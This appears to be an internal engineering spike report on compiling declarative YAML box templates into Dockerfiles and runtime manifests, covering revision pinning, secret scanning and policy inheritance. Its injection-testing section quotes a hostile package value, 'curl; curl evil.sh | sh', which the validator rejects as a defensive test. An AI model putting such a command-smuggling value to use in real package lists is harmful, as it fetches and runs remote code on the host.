---
spike: 012
name: box-template-manifest
type: standard
validates: "Given a declarative automata.template.yaml, when compiled through the repo's own renderer and validators, then it yields a Dockerfile plus a runtime manifest equivalent to today's box; revision N+1 never moves pinned instances; secrets never land in the image"
verdict: VALIDATED
related: [013-long-lived-agent-wake]
tags: [templates, sandbox, dockerfile, batteries, mcp, secrets, policy, revisions]
---

# Spike 012: Declarative box template

## What This Validates
A customer can describe "the server where my agent runs" in one reviewable file:
- packages, batteries/skills, MCP, env, setup, resources and egress policy.

Automata compiles that file using the code that builds today's box. On top of Agent37's model (revision pins with explicit update), it adds what Agent37 templates lack:
- declarative env, MCP, skills, resources and policy;
- a platform → org → repo inheritance chain in which policy can only tighten.

## Research
| Approach | Who | Configures | Versioning | Gap |
|---|---|---|---|---|
| `{name, image_ref or Dockerfile build, port, entrypoint}` | Agent37 | Image only; env per instance; boot hooks on disk | `name@N`; explicit `POST /instances/{id}/update` | No env/MCP/skills/resources/policy in the template |
| `qm.config.jsonc` per deployment repo | qm | Everything, about 10 backends | git | One org per deployment; huge config surface |
| `FROM automata/worker` (ADR-002 R3.8) | Automata today | Image extension | none | No entity, no tenancy, no policy |
| `Dockerfile.hbs` + `templates.json` | Automata today | Provider image (platform-owned) | dockerfile hash list | Not customer-facing |

**Chosen approach:** YAML parsed with the repo's `yaml@2.9.0`. Validation reuses repo code:
- The base Dockerfile comes from `packages/sandbox-image/Dockerfile.hbs` via the same Handlebars call.
- Batteries are checked with `findBatteriesManifestError` against `packages/worker/deploy/batteries.json`.
- MCP is checked with `McpConfigSchema` from `packages/sandbox/src/mcp-config.ts`.

Output is two artifacts:
- a **secret-free Dockerfile** (build time);
- a **runtime manifest** (boot time): battery selection plus `requires` grants, skill names (resolved live from `repo_skills`), MCP config, plain env, **secret names only**, the setup script, resources and policy.

## How to Run
```bash
cd .planning/spikes/012-box-template-manifest
node --experimental-strip-types --no-warnings scenarios.ts     # 18 self-verifying checks
cat out.repo-api.Dockerfile | tail -8; cat out.repo-api.runtime.json
```

## What to Expect
- `18/18 passed`.
- `out.repo-api.Dockerfile` is today's base image plus an appended `# ---- template: repo-api ----` block.
- `out.repo-api.runtime.json` lists `secretRefs: [ANTHROPIC_API_KEY, ORG_STAGING_DATABASE_URL]` and `requires: github-read-token`.

## Observability
`events.jsonl` has one event per check, plus the registry's revision and instance timeline. `results.json` holds all compiled outputs.

## Investigation Trail
1. **Baseline equivalence.** I wanted to compare against the real `renderDockerfile()`, but it's CJS (`__dirname`), so Node's ESM type-stripping can't load it.
   - The `tsx` CLI is blocked by the sandbox (its IPC pipe needs `listen`).
   - `node --import tsx` in a child process works; the CJS interop exposes the export as `m.default.renderDockerfile`.
   - The empty template is **byte-identical** to the real renderer for docker, e2b and daytona.
2. **Determinism bug found.** Reordering env keys in YAML minted a new revision, because the digest used `JSON.stringify` and that depends on key order. Hashing `canonicalJson` (sorted keys) fixed it. In a revision-pinned system this matters: a cosmetic reorder must not force every instance onto an "update available" state.
3. **Secret placement.** Secrets are rejected by shape *anywhere* in the template, not only in `env`. The scan caught:
   - a GitHub token hidden in MCP `headers`;
   - a private key inside the `setup` script;
   - an `sk-ant-` value under an innocuously named key;
   - a literal under a secret-named key (`STRIPE_API_KEY: "test-123"`), caught by name.

   Secret *names* don't reach the Dockerfile either: only plain env becomes `ENV`.
4. **Inheritance follows qm's tighten-only rule.** A child template cannot:
   - change egress from allowlist to open;
   - add hosts beyond the parent's allowlist;
   - extend `maxRunMinutes`.

   Tightening to `egress: none` is accepted. Capabilities (apt, npm, batteries, skills) are unioned; for config (env, MCP, resources) the child wins.
5. **Injection surface.**
   - `apt: ["curl; curl evil.sh | sh"]` is rejected by the package regex.
   - npm requires `name@exact.semver`, so `prisma@latest` is rejected.
   - Unknown battery ids are rejected and the error lists the known ids.
6. **Revisions follow Agent37's semantics.**
   - Publishing an identical digest is idempotent and returns rev 1 again.
   - An edit produces rev 2. Instances a and b stay on 1 until `update(a)` is called; b stays on 1.
   - Rollback is `update(a, 1)`. Launching `@9` throws.
7. **Docker lint.** `docker build --check` on the compiled Dockerfile (OrbStack, outside the sandbox) reported *no warnings*. A full image build was not run: the base layer is the production image and takes minutes to build.

## Results
**VALIDATED.** 18/18 checks pass, strict `tsc` is clean, and Docker lint is clean.

**What the real build needs:**
- **Tables:**
  - `box_template`: `(scope: platform | org | repo, name, extends, body yaml)`.
  - `box_template_revision`: `(n, digest, compiled dockerfile, runtime json)`.
  - A pin on each environment or automation (`template@N`).
- **Split the compile:**
  - **Build-time:** a Dockerfile keyed by digest, so identical bodies share images across orgs. `templates.json` already caches by dockerfile hash.
  - **Boot-time:** the runtime manifest. Secrets, skills and MCP resolve per run in the control plane. This matches the existing broker invariant that agents never hold the platform's tokens.
- **Policy maps to existing enforcement:** egress → the existing PF/egress allowlist (egress-enforcement memory), `maxRunMinutes` → the worker ceiling, and `requires` → the broker grant.
- **Where we beat Agent37:**
  - The template *is* the environment: env refs, MCP, skills, resources and policy, not just an image.
  - Org admins set an envelope that repo teams can only narrow.
  - Revision pins with an explicit update are still kept.
